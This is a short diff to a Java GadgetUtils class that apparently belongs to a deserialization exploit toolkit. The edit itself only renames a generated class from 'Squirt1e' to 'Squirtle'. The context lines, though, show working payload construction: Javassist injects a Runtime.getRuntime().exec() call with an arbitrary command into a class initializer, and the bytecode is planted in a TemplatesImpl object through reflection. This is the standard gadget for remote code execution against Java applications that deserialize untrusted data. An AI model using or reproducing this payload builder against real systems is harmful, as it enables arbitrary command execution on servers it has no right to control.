@@ -17,7 +17,7 @@ public class GadgetUtils {
     public static TemplatesImpl createTemplatesImpl(String cmd)throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException{
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-        CtClass cc = pool.makeClass("Squirt1e");
+        CtClass cc = pool.makeClass("Squirtle");
         cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec("+cmd+");");
         cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
         cc.writeFile();
@@ -27,7 +27,7 @@ public class GadgetUtils {
         //补充实例化新建类所需的条件
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
         ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
-        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");
+        ReflectionUtils.setFieldValue(templates, "_name", "Squirtle");
         setFieldValue(templates,"_class",null);
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
         return templates;
